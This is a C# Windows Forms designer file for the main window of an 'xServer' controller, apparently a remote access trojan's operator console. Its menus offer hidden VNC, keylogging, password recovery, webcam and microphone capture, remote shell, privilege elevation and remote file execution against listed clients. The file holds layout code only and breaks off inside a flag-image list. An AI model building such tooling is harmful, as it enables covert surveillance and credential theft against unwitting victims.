using System;
using xServer.Controls;

namespace xServer.Forms
{
    partial class FrmMain
    {
        /// <summary>
        /// Erforderliche Designervariable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Verwendete Ressourcen bereinigen.
        /// </summary>
        /// <param name="disposing">True, wenn verwaltete Ressourcen gelöscht werden sollen; andernfalls False.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Vom Windows Form-Designer generierter Code

        /// <summary>
        /// Erforderliche Methode für die Designerunterstützung.
        /// Der Inhalt der Methode darf nicht mit dem Code-Editor geändert werden.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.surveillanceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteHVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteWebcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteMicrophoneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.systemInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startupManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.taskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.registryEditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
            this.actionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.shutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.standbyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.OtherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.localFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.showMessageboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.lineToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
            this.selectAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.imgFlags = new System.Windows.Forms.ImageList(this.components);
            this.notifyIcon = new System.Windows.Forms.NotifyIcon(this.components);
            this.tableLayoutPanel = new System.Windows.Forms.TableLayoutPanel();
            this.lstClients = new xServer.Controls.AeroListView();
            this.hIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hTag = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hUserPC = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hVersion = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hUserStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hCountry = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hOS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hAccountType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.guna2ImageButton1 = new Guna.UI2.WinForms.Guna2ImageButton();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.guna2ShadowPanel1 = new Guna.UI2.WinForms.Guna2ShadowPanel();
            this.tabPage6 = new System.Windows.Forms.TabPage();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
            this.tabPage7 = new System.Windows.Forms.TabPage();
            this.tabPage8 = new System.Windows.Forms.TabPage();
            this.tabPage9 = new System.Windows.Forms.TabPage();
            this.contextMenuStrip.SuspendLayout();
            this.tableLayoutPanel.SuspendLayout();
            this.guna2TabControl1.SuspendLayout();
            this.SuspendLayout();
            // 
            // contextMenuStrip
            // 
            this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.surveillanceToolStripMenuItem,
            this.systemToolStripMenuItem,
            this.OtherToolStripMenuItem,
            this.connectionToolStripMenuItem,
            this.lineToolStripMenuItem,
            this.selectAllToolStripMenuItem});
            this.contextMenuStrip.Name = "ctxtMenu";
            this.contextMenuStrip.Size = new System.Drawing.Size(138, 120);
            // 
            // surveillanceToolStripMenuItem
            // 
            this.surveillanceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.remoteDesktopToolStripMenuItem,
            this.remoteHVNCToolStripMenuItem,
            this.passwordRecoveryToolStripMenuItem,
            this.keyloggerToolStripMenuItem,
            this.remoteWebcamToolStripMenuItem,
            this.remoteMicrophoneToolStripMenuItem});
            this.surveillanceToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("surveillanceToolStripMenuItem.Image")));
            this.surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.surveillanceToolStripMenuItem.Text = "Surveillance";
            // 
            // remoteDesktopToolStripMenuItem
            // 
            this.remoteDesktopToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteDesktopToolStripMenuItem.Image")));
            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
            // 
            // remoteHVNCToolStripMenuItem
            // 
            this.remoteHVNCToolStripMenuItem.Image = global::xServer.Properties.Resources.computer;
            this.remoteHVNCToolStripMenuItem.Name = "remoteHVNCToolStripMenuItem";
            this.remoteHVNCToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.remoteHVNCToolStripMenuItem.Text = "Hvnc";
            this.remoteHVNCToolStripMenuItem.Click += new System.EventHandler(this.remoteHVNCToolStripMenuItem_Click);
            // 
            // passwordRecoveryToolStripMenuItem
            // 
            this.passwordRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("passwordRecoveryToolStripMenuItem.Image")));
            this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
            this.passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
            this.passwordRecoveryToolStripMenuItem.Click += new System.EventHandler(this.passwordRecoveryToolStripMenuItem_Click);
            // 
            // keyloggerToolStripMenuItem
            // 
            this.keyloggerToolStripMenuItem.Image = global::xServer.Properties.Resources.logger;
            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.keyloggerToolStripMenuItem.Text = "Keylogger";
            this.keyloggerToolStripMenuItem.Click += new System.EventHandler(this.keyloggerToolStripMenuItem_Click);
            // 
            // remoteWebcamToolStripMenuItem
            // 
            this.remoteWebcamToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteWebcamToolStripMenuItem.Image")));
            this.remoteWebcamToolStripMenuItem.Name = "remoteWebcamToolStripMenuItem";
            this.remoteWebcamToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.remoteWebcamToolStripMenuItem.Text = "Remote Webcam";
            this.remoteWebcamToolStripMenuItem.Click += new System.EventHandler(this.remoteWebcamToolStripMenuItem_Click);
            // 
            // remoteMicrophoneToolStripMenuItem
            // 
            this.remoteMicrophoneToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteMicrophoneToolStripMenuItem.Image")));
            this.remoteMicrophoneToolStripMenuItem.Name = "remoteMicrophoneToolStripMenuItem";
            this.remoteMicrophoneToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.remoteMicrophoneToolStripMenuItem.Text = "Remote Microphone";
            this.remoteMicrophoneToolStripMenuItem.Click += new System.EventHandler(this.remoteMicrophoneToolStripMenuItem_Click);
            // 
            // systemToolStripMenuItem
            // 
            this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.systemInformationToolStripMenuItem,
            this.fileManagerToolStripMenuItem,
            this.startupManagerToolStripMenuItem,
            this.taskManagerToolStripMenuItem,
            this.remoteShellToolStripMenuItem,
            this.connectionsToolStripMenuItem,
            this.reverseProxyToolStripMenuItem,
            this.registryEditorToolStripMenuItem,
            this.elevateClientPermissionsToolStripMenuItem,
            this.ctxtLine,
            this.actionsToolStripMenuItem});
            this.systemToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemToolStripMenuItem.Image")));
            this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
            this.systemToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.systemToolStripMenuItem.Text = "System";
            // 
            // systemInformationToolStripMenuItem
            // 
            this.systemInformationToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemInformationToolStripMenuItem.Image")));
            this.systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.systemInformationToolStripMenuItem.Text = "System Information";
            this.systemInformationToolStripMenuItem.Click += new System.EventHandler(this.systemInformationToolStripMenuItem_Click);
            // 
            // fileManagerToolStripMenuItem
            // 
            this.fileManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fileManagerToolStripMenuItem.Image")));
            this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.fileManagerToolStripMenuItem.Text = "File Manager";
            this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
            // 
            // startupManagerToolStripMenuItem
            // 
            this.startupManagerToolStripMenuItem.Image = global::xServer.Properties.Resources.startup_programs;
            this.startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
            this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.startupManagerToolStripMenuItem.Text = "Startup Manager";
            this.startupManagerToolStripMenuItem.Click += new System.EventHandler(this.startupManagerToolStripMenuItem_Click);
            // 
            // taskManagerToolStripMenuItem
            // 
            this.taskManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("taskManagerToolStripMenuItem.Image")));
            this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
            this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.taskManagerToolStripMenuItem.Text = "Task Manager";
            this.taskManagerToolStripMenuItem.Click += new System.EventHandler(this.taskManagerToolStripMenuItem_Click);
            // 
            // remoteShellToolStripMenuItem
            // 
            this.remoteShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteShellToolStripMenuItem.Image")));
            this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
            this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.remoteShellToolStripMenuItem.Text = "Remote Shell";
            this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
            // 
            // connectionsToolStripMenuItem
            // 
            this.connectionsToolStripMenuItem.Image = global::xServer.Properties.Resources.transmit_blue;
            this.connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
            this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.connectionsToolStripMenuItem.Text = "TCP Connections";
            this.connectionsToolStripMenuItem.Click += new System.EventHandler(this.connectionsToolStripMenuItem_Click);
            // 
            // reverseProxyToolStripMenuItem
            // 
            this.reverseProxyToolStripMenuItem.Image = global::xServer.Properties.Resources.server_link;
            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
            this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem_Click);
            // 
            // registryEditorToolStripMenuItem
            // 
            this.registryEditorToolStripMenuItem.Image = global::xServer.Properties.Resources.registry;
            this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.registryEditorToolStripMenuItem.Text = "Registry Editor";
            this.registryEditorToolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
            // 
            // elevateClientPermissionsToolStripMenuItem
            // 
            this.elevateClientPermissionsToolStripMenuItem.Image = global::xServer.Properties.Resources.uac_shield;
            this.elevateClientPermissionsToolStripMenuItem.Name = "elevateClientPermissionsToolStripMenuItem";
            this.elevateClientPermissionsToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.elevateClientPermissionsToolStripMenuItem.Text = "Elevate Client Permissions";
            this.elevateClientPermissionsToolStripMenuItem.Click += new System.EventHandler(this.elevateClientPermissionsToolStripMenuItem_Click);
            // 
            // ctxtLine
            // 
            this.ctxtLine.Name = "ctxtLine";
            this.ctxtLine.Size = new System.Drawing.Size(208, 6);
            // 
            // actionsToolStripMenuItem
            // 
            this.actionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.shutdownToolStripMenuItem,
            this.restartToolStripMenuItem,
            this.standbyToolStripMenuItem});
            this.actionsToolStripMenuItem.Image = global::xServer.Properties.Resources.actions;
            this.actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.actionsToolStripMenuItem.Text = "Actions";
            // 
            // shutdownToolStripMenuItem
            // 
            this.shutdownToolStripMenuItem.Image = global::xServer.Properties.Resources.shutdown;
            this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
            this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
            this.shutdownToolStripMenuItem.Text = "Shutdown";
            this.shutdownToolStripMenuItem.Click += new System.EventHandler(this.shutdownToolStripMenuItem_Click);
            // 
            // restartToolStripMenuItem
            // 
            this.restartToolStripMenuItem.Image = global::xServer.Properties.Resources.restart;
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
            // 
            // standbyToolStripMenuItem
            // 
            this.standbyToolStripMenuItem.Image = global::xServer.Properties.Resources.standby;
            this.standbyToolStripMenuItem.Name = "standbyToolStripMenuItem";
            this.standbyToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
            this.standbyToolStripMenuItem.Text = "Standby";
            this.standbyToolStripMenuItem.Click += new System.EventHandler(this.standbyToolStripMenuItem_Click);
            // 
            // OtherToolStripMenuItem
            // 
            this.OtherToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.remoteExecuteToolStripMenuItem,
            this.visitWebsiteToolStripMenuItem,
            this.showMessageboxToolStripMenuItem});
            this.OtherToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("OtherToolStripMenuItem.Image")));
            this.OtherToolStripMenuItem.Name = "OtherToolStripMenuItem";
            this.OtherToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.OtherToolStripMenuItem.Text = "Other";
            this.OtherToolStripMenuItem.Click += new System.EventHandler(this.miscellaneousToolStripMenuItem_Click);
            // 
            // remoteExecuteToolStripMenuItem
            // 
            this.remoteExecuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.localFileToolStripMenuItem,
            this.webFileToolStripMenuItem});
            this.remoteExecuteToolStripMenuItem.Image = global::xServer.Properties.Resources.lightning;
            this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
            // 
            // localFileToolStripMenuItem
            // 
            this.localFileToolStripMenuItem.Image = global::xServer.Properties.Resources.drive_go;
            this.localFileToolStripMenuItem.Name = "localFileToolStripMenuItem";
            this.localFileToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
            this.localFileToolStripMenuItem.Text = "Local File...";
            this.localFileToolStripMenuItem.Click += new System.EventHandler(this.localFileToolStripMenuItem_Click);
            // 
            // webFileToolStripMenuItem
            // 
            this.webFileToolStripMenuItem.Image = global::xServer.Properties.Resources.world_go;
            this.webFileToolStripMenuItem.Name = "webFileToolStripMenuItem";
            this.webFileToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
            this.webFileToolStripMenuItem.Text = "Web File...";
            this.webFileToolStripMenuItem.Click += new System.EventHandler(this.webFileToolStripMenuItem_Click);
            // 
            // visitWebsiteToolStripMenuItem
            // 
            this.visitWebsiteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("visitWebsiteToolStripMenuItem.Image")));
            this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
            this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.visitWebsiteToolStripMenuItem.Text = "Visit Website";
            this.visitWebsiteToolStripMenuItem.Click += new System.EventHandler(this.visitWebsiteToolStripMenuItem_Click);
            // 
            // showMessageboxToolStripMenuItem
            // 
            this.showMessageboxToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("showMessageboxToolStripMenuItem.Image")));
            this.showMessageboxToolStripMenuItem.Name = "showMessageboxToolStripMenuItem";
            this.showMessageboxToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.showMessageboxToolStripMenuItem.Text = "Show Messagebox";
            this.showMessageboxToolStripMenuItem.Click += new System.EventHandler(this.showMessageboxToolStripMenuItem_Click);
            // 
            // connectionToolStripMenuItem
            // 
            this.connectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.updateToolStripMenuItem,
            this.reconnectToolStripMenuItem,
            this.disconnectToolStripMenuItem,
            this.uninstallToolStripMenuItem});
            this.connectionToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("connectionToolStripMenuItem.Image")));
            this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.connectionToolStripMenuItem.Text = "Connection";
            // 
            // updateToolStripMenuItem
            // 
            this.updateToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("updateToolStripMenuItem.Image")));
            this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
            this.updateToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.updateToolStripMenuItem.Text = "Update";
            this.updateToolStripMenuItem.Click += new System.EventHandler(this.updateToolStripMenuItem_Click);
            // 
            // reconnectToolStripMenuItem
            // 
            this.reconnectToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("reconnectToolStripMenuItem.Image")));
            this.reconnectToolStripMenuItem.Name = "reconnectToolStripMenuItem";
            this.reconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.reconnectToolStripMenuItem.Text = "Reconnect";
            this.reconnectToolStripMenuItem.Click += new System.EventHandler(this.reconnectToolStripMenuItem_Click);
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("disconnectToolStripMenuItem.Image")));
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
            // 
            // uninstallToolStripMenuItem
            // 
            this.uninstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uninstallToolStripMenuItem.Image")));
            this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.uninstallToolStripMenuItem.Text = "Uninstall";
            this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
            // 
            // lineToolStripMenuItem
            // 
            this.lineToolStripMenuItem.Name = "lineToolStripMenuItem";
            this.lineToolStripMenuItem.Size = new System.Drawing.Size(134, 6);
            // 
            // selectAllToolStripMenuItem
            // 
            this.selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
            this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.selectAllToolStripMenuItem.Text = "Select All";
            this.selectAllToolStripMenuItem.Click += new System.EventHandler(this.selectAllToolStripMenuItem_Click);
            // 
            // imgFlags
            // 
            this.imgFlags.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgFlags.ImageStream")));
            this.imgFlags.TransparentColor = System.Drawing.Color.Transparent;
            this.imgFlags.Images.SetKeyName(0, "ad.png");
            this.imgFlags.Images.SetKeyName(1, "ae.png");
            this.imgFlags.Images.SetKeyName(2, "af.png");
            this.imgFlags.Images.SetKeyName(3, "ag.png");
            this.imgFlags.Images.SetKeyName(4, "ai.png");
            this.imgFlags.Images.SetKeyName(5, "al.png");
            this.imgFlags.Images.SetKeyName(6, "am.png");
            this.imgFlags.Images.SetKeyName(7, "an.png");
            this.imgFlags.Images.SetKeyName(8, "ao.png");
            this.imgFlags.Images.SetKeyName(9, "ar.png");
            this.imgFlags.Images.SetKeyName(10, "as.png");
            this.imgFlags.Images.SetKeyName(11, "at.png");
            this.imgFlags.Images.SetKeyName(12, "au.png");
            this.imgFlags.Images.SetKeyName(13, "aw.png");
            this.imgFlags.Images.SetKeyName(14, "ax.png");
            this.imgFlags.Images.SetKeyName(15, "az.png");
            this.imgFlags.Images.SetKeyName(16, "ba.png");
            this.imgFlags.Images.SetKeyName(17, "bb.png");
            this.imgFlags.Images.SetKeyName(18, "bd.png");
            this.imgFlags.Images.SetKeyName(19, "be.png");
            this.imgFlags.Images.SetKeyName(20, "bf.png");
            this.imgFlags.Images.SetKeyName(21, "bg.png");
            this.imgFlags.Images.SetKeyName(22, "bh.png");
            this.imgFlags.Images.SetKeyName(23, "bi.png");
            this.imgFlags.Images.SetKeyName(24, "bj.png");
            this.imgFlags.Images.SetKeyName(25, "bm.png");
            this.imgFlags.Images.SetKeyName(26, "bn.png");
            this.imgFlags.Images.SetKeyName(27, "bo.png");
            this.imgFlags.Images.SetKeyName(28, "br.png");
            this.imgFlags.Images.SetKeyName(29, "bs.png");
            this.imgFlags.Images.SetKeyName(30, "bt.png");
            this.imgFlags.Images.SetKeyName(31, "bv.png");
            this.imgFlags.Images.SetKeyName(32, "bw.png");
            this.imgFlags.Images.SetKeyName(33, "by.png");
            this.imgFlags.Images.SetKeyName(34, "bz.png");
            this.imgFlags.Images.SetKeyName(35, "ca.png");
            this.imgFlags.Images.SetKeyName(36, "catalonia.png");
            this.imgFlags.Images.SetKeyName(37, "cc.png");
            this.imgFlags.Images.SetKeyName(38, "cd.png");
            this.imgFlags.Images.SetKeyName(39, "cf.png");
            this.imgFlags.Images.SetKeyName(40, "cg.png");
            this.imgFlags.Images.SetKeyName(41, "ch.png");
            this.imgFlags.Images.SetKeyName(42, "ci.png");
            this.imgFlags.Images.SetKeyName(43, "ck.png");
            this.imgFlags.Images.SetKeyName(44, "cl.png");
            this.imgFlags.Images.SetKeyName(45, "cm.png");
            this.imgFlags.Images.SetKeyName(46, "cn.png");
            this.imgFlags.Images.SetKeyName(47, "co.png");
            this.imgFlags.Images.SetKeyName(48, "cr.png");
            this.imgFlags.Images.SetKeyName(49, "cs.png");
            this.imgFlags.Images.SetKeyName(50, "cu.png");
            this.imgFlags.Images.SetKeyName(51, "cv.png");
            this.imgFlags.Images.SetKeyName(52, "cx.png");
            this.imgFlags.Images.SetKeyName(53, "cy.png");
            this.imgFlags.Images.SetKeyName(54, "cz.png");
            this.imgFlags.Images.SetKeyName(55, "de.png");
            this.imgFlags.Images.SetKeyName(56, "dj.png");
            this.imgFlags.Images.SetKeyName(57, "dk.png");
            this.imgFlags.Images.SetKeyName(58, "dm.png");
            this.imgFlags.Images.SetKeyName(59, "do.png");
            this.imgFlags.Images.SetKeyName(60, "dz.png");
            this.imgFlags.Images.SetKeyName(61, "ec.png");
            this.imgFlags.Images.SetKeyName(62, "ee.png");
            this.imgFlags.Images.SetKeyName(63, "eg.png");
            this.imgFlags.Images.SetKeyName(64, "eh.png");
            this.imgFlags.Images.SetKeyName(65, "england.png");
            this.imgFlags.Images.SetKeyName(66, "er.png");
            this.imgFlags.Images.SetKeyName(67, "es.png");
            this.imgFlags.Images.SetKeyName(68, "et.png");
            this.imgFlags.Images.SetKeyName(69, "europeanunion.png");
            this.imgFlags.Images.SetKeyName(70, "fam.png");
            this.imgFlags.Images.SetKeyName(71, "fi.png");
            this.imgFlags.Images.SetKeyName(72, "fj.png");
            this.imgFlags.Images.SetKeyName(73, "fk.png");
            this.imgFlags.Images.SetKeyName(74, "fm.png");
            this.imgFlags.Images.SetKeyName(75, "fo.png");
            this.imgFlags.Images.SetKeyName(76, "fr.png");
            this.imgFlags.Images.SetKeyName(77, "ga.png");
            this.imgFlags.Images.SetKeyName(78, "gb.png");
            this.imgFlags.Images.SetKeyName(79, "gd.png");
            this.imgFlags.Images.SetKeyName(80, "ge.png");
            this.imgFlags.Images.SetKeyName(81, "gf.png");
            this.imgFlags.Images.SetKeyName(82, "gh.png");
            this.imgFlags.Images.SetKeyName(83, "gi.png");
            this.imgFlags.Images.SetKeyName(84, "gl.png");
            this.imgFlags.Images.SetKeyName(85, "gm.png");
            this.imgFlags.Images.SetKeyName(86, "gn.png");
            this.imgFlags.Images.SetKeyName(87, "gp.png");
            this.imgFlags.Images.SetKeyName(88, "gq.png");
            this.imgFlags.Images.SetKeyName(89, "gr.png");
            this.imgFlags.Images.SetKeyName(90, "gs.png");
            this.imgFlags.Images.SetKeyName(91, "gt.png");
            this.imgFlags.Images.SetKeyName(92, "gu.png");
            this.imgFlags.Images.SetKeyName(93, "gw.png");
            this.imgFlags.Images.SetKeyName(94, "gy.png");
            this.imgFlags.Images.SetKeyName(95, "hk.png");
            this.imgFlags.Images.SetKeyName(96, "hm.png");
            this.imgFlags.Images.SetKeyName(97, "hn.png");
            this.imgFlags.Images.SetKeyName(98, "hr.png");
            this.imgFlags.Images.SetKeyName(99, "ht.png");
            this.imgFlags.Images.SetKeyName(100, "hu.png");
            this.imgFlags.Images.SetKeyName(101, "id.png");
            this.imgFlags.Images.SetKeyName(102, "ie.png");
            this.imgFlags.Images.SetKeyName(103, "il.png");
            this.imgFlags.Images.SetKeyName(104, "in.png");
            this.imgFlags.Images.SetKeyName(105, "io.png");
            this.imgFlags.Images.SetKeyName(106, "iq.png");
            this.imgFlags.Images.SetKeyName(107, "ir.png");
            this.imgFlags.Images.SetKeyName(108, "is.png");
            this.imgFlags.Images.SetKeyName(109, "it.png");
            this.imgFlags.Images.SetKeyName(110, "jm.png");
            this.imgFlags.Images.SetKeyName(111, "jo.png");
            this.imgFlags.Images.SetKeyName(112, "jp.png");
            this.imgFlags.Images.SetKeyName(113, "ke.png");
            this.imgFlags.Images.SetKeyName(114, "kg.png");
            this.imgFlags.Images.SetKeyName(115, "kh.png");
            this.imgFlags.Images.SetKeyName(116, "ki.png");
            this.imgFlags.Images.SetKeyName(117, "km.png");
